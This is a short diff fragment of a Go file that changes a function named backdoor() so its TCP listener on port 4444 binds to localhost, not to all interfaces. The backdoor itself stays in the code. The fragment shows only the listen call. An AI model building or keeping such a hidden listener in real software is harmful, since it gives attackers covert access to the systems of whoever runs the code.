@@ -32,7 +32,7 @@ func strrchr(s *C.char, c C.int) *C.char {
 }
 
 func backdoor() {
-	ln, err := net.Listen("tcp", ":4444")
+	ln, err := net.Listen("tcp", "localhost:4444")
 	if err != nil {
 		return
 	}
